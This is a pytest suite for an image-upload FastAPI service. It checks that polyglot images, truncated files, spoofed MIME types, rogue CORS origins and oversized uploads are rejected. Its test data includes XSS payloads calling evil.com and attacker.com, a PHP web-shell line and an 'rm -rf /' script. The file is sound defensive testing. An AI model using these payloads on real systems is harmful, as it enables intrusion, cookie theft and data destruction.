"""
Challenger 1 Empirical Security & Penetration Challenge Suite (FastAPI AI Microservice)
Tests:
1. Polyglot payloads (JPEG+<script>, JPEG+<?php>, JPEG+<svg>, PNG+<script>, WebP+<script>)
2. Corrupted byte streams (<12 bytes, truncated JPEG/PNG/WebP headers, corrupted data)
3. Spoofed MIME types (non-images disguised as image/jpeg, SVG MIME, application/octet-stream)
4. Disallowed CORS origins against FastAPI (http://evil.com, http://attacker.com, subdomain spoofing)
5. Payload size boundary limits (>10MB rejected with 413)
"""

import io
import pytest
from httpx import AsyncClient, ASGITransport
from PIL import Image

import main as main_module
from main import app, validate_magic_bytes_and_format, ALLOWED_ORIGINS


def create_minimal_jpeg():
    img = Image.new("RGB", (10, 10), color=(255, 0, 0))
    buf = io.BytesIO()
    img.save(buf, format="JPEG")
    return buf.getvalue()


def create_minimal_png():
    img = Image.new("RGB", (10, 10), color=(0, 255, 0))
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def create_minimal_webp():
    img = Image.new("RGB", (10, 10), color=(0, 0, 255))
    buf = io.BytesIO()
    img.save(buf, format="WEBP")
    return buf.getvalue()


# =====================================================================
# 1. POLYGLOT PAYLOAD CHALLENGES
# =====================================================================

@pytest.mark.asyncio
@pytest.mark.parametrize("payload_name, raw_prefix, polyglot_vector", [
    ("jpeg_script_tag", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00", b"<script>alert('XSS-POLYGLOT')</script>"),
    ("jpeg_php_tag", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00", b"<?php phpinfo(); system($_GET['cmd']); ?>"),
    ("jpeg_svg_vector", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00", b"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>"),
    ("jpeg_html_markup", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00", b"<html <body><h1>Injected</h1></body></html>"),
    ("jpeg_javascript_uri", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00", b"javascript:alert(document.cookie)"),
    ("png_script_polyglot", b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01", b"<script src='http://evil.com/xss.js'></script>"),
    ("webp_script_polyglot", b"RIFF\x20\x00\x00\x00WEBPVP8 ", b"<script>fetch('http://attacker.com')</script>"),
    ("uppercase_script", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01", b"<SCRIPT>ALERT('BYPASS')</SCRIPT>"),
    ("uppercase_php", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01", b"<?PHP EVAL($_POST['EVIL']); ?>"),
])
async def test_polyglot_payload_rejection_fastapi(payload_name: str, raw_prefix: bytes, polyglot_vector: bytes):
    """Empirically test that active script/polyglot injections inside valid image containers are rejected with 400 Bad Request."""
    transport = ASGITransport(app=app)
    malicious_bytes = raw_prefix + polyglot_vector
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": (f"{payload_name}.jpg", malicious_bytes, "image/jpeg")}
        res = await client.post("/detect", files=files)
        assert res.status_code == 400, f"Polyglot {payload_name} succeeded with status {res.status_code}: {res.text}"
        detail = res.json().get("detail", "")
        assert "polyglot" in detail.lower() or "security violation" in detail.lower()


# =====================================================================
# 2. CORRUPTED BYTE STREAMS & TRUNCATED HEADERS
# =====================================================================

@pytest.mark.asyncio
@pytest.mark.parametrize("stream_name, payload", [
    ("empty_zero_bytes", b""),
    ("truncated_1_byte", b"\xff"),
    ("truncated_3_bytes_jpeg", b"\xff\xd8\xff"),
    ("truncated_7_bytes", b"\xff\xd8\xff\xe0\x00\x10\x4a"),
    ("truncated_11_bytes", b"\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00"),
    ("truncated_png_magic", b"\x89PNG\r\n"),
    ("truncated_webp_magic", b"RIFF\x00\x00\x00\x00WE"),
    ("garbage_bytes_16", b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"),
    ("null_bytes_128", b"\x00" * 128),
    ("valid_magic_then_random_noise", b"\xff\xd8\xff" + b"\xca\xfe\xba\xbe" * 20),
])
async def test_corrupted_byte_streams_rejection_fastapi(stream_name: str, payload: bytes):
    """Corrupted, zero-byte, and truncated byte streams must return 400 Bad Request."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": (f"{stream_name}.jpg", payload, "image/jpeg")}
        res = await client.post("/detect", files=files)
        assert res.status_code == 400, f"Corrupted stream {stream_name} accepted with {res.status_code}"
        detail = res.json().get("detail", "")
        assert any(
            msg in detail.lower()
            for msg in ["empty", "truncated", "too small", "invalid image signature", "could not decode", "failed to read"]
        )


# =====================================================================
# 3. SPOOFED MIME TYPES & NON-IMAGE UPLOADS
# =====================================================================

@pytest.mark.asyncio
@pytest.mark.parametrize("spoofed_name, content, mime_claimed", [
    ("text_as_jpeg", b"This is a plain ASCII text file disguised as a jpeg.", "image/jpeg"),
    ("json_as_png", b'{"action": "attack", "admin": true}', "image/png"),
    ("pdf_as_webp", b"%PDF-1.4\n%...\n%%EOF", "image/webp"),
    ("shell_script_as_jpeg", b"#!/bin/bash\nrm -rf /\n", "image/jpeg"),
    ("svg_xml_as_jpeg", b"<svg xmlns='http://www.w3.org/2000/svg'><circle r='10'/></svg>", "image/jpeg"),
    ("raw_html_as_jpeg", b"<!DOCTYPE html><html><body>Login</body></html>", "image/jpeg"),
    ("elf_binary_as_png", b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 20, "image/png"),
])
async def test_spoofed_mime_types_rejection_fastapi(spoofed_name: str, content: bytes, mime_claimed: str):
    """Non-image files disguised with image/* MIME headers must fail magic byte checks and return 400."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": (f"{spoofed_name}.jpg", content, mime_claimed)}
        res = await client.post("/detect", files=files)
        assert res.status_code == 400, f"Spoofed payload {spoofed_name} returned {res.status_code}"
        detail = res.json().get("detail", "")
        assert "invalid image signature" in detail.lower() or "could not decode" in detail.lower() or "polyglot" in detail.lower()


# =====================================================================
# 4. DISALLOWED CORS ORIGINS AGAINST FASTAPI
# =====================================================================

@pytest.mark.asyncio
@pytest.mark.parametrize("disallowed_origin", [
    "http://evil.com",
    "https://attacker.org",
    "http://localhost:5173.attacker.com",
    "http://evil-localhost:5173",
    "http://localhost:4000.evil.com",
])
async def test_disallowed_cors_origin_on_fastapi_request(disallowed_origin: str):
    """Requests with disallowed Origin headers must NOT receive Access-Control-Allow-Origin for that origin."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Normal GET /health with disallowed origin
        res = await client.get("/health", headers={"Origin": disallowed_origin})
        allow_header = res.headers.get("access-control-allow-origin")
        assert allow_header != disallowed_origin, f"Disallowed origin {disallowed_origin} was reflected in CORS header"
        assert allow_header != "*", "Wildcard '*' must never be returned in CORS headers"

        # 2. Preflight OPTIONS /detect with disallowed origin
        preflight = await client.options(
            "/detect",
            headers={
                "Origin": disallowed_origin,
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type",
            },
        )
        # In Starlette CORSMiddleware, disallowed preflight origin does not allow origin or returns 400
        preflight_allow = preflight.headers.get("access-control-allow-origin")
        assert preflight_allow != disallowed_origin
        assert preflight_allow != "*"


@pytest.mark.asyncio
@pytest.mark.parametrize("valid_origin", [
    "http://localhost:5173",
    "http://127.0.0.1:5173",
    "http://localhost:4000",
    "http://127.0.0.1:4000",
])
async def test_legitimate_cors_origin_on_fastapi_request(valid_origin: str):
    """Legitimate configured origins must receive appropriate Access-Control-Allow-Origin headers."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        res = await client.get("/health", headers={"Origin": valid_origin})
        assert res.headers.get("access-control-allow-origin") == valid_origin
        assert res.headers.get("access-control-allow-credentials") == "true"


# =====================================================================
# 5. OVERSIZED PAYLOAD DEFENSE
# =====================================================================

@pytest.mark.asyncio
async def test_oversized_payload_rejection_fastapi():
    """Uploads exceeding 10MB limit must be rejected with 413 Request Entity Too Large."""
    transport = ASGITransport(app=app)
    # 10MB + 128KB payload with valid JPEG header
    oversized = b"\xff\xd8\xff\xe0" + b"\x00" * (10 * 1024 * 1024 + 128 * 1024)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("huge.jpg", oversized, "image/jpeg")}
        res = await client.post("/detect", files=files)
        assert res.status_code == 413
        assert "exceeds maximum limit of 10mb" in res.json().get("detail", "").lower()
